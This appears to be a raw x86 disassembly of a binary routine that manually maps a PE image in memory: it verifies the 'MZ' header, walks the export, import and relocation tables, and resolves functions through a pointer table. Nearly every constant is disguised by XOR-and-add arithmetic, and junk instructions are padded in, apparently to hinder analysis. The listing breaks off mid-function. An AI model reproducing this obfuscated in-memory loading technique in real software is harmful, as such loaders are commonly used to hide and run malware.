  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
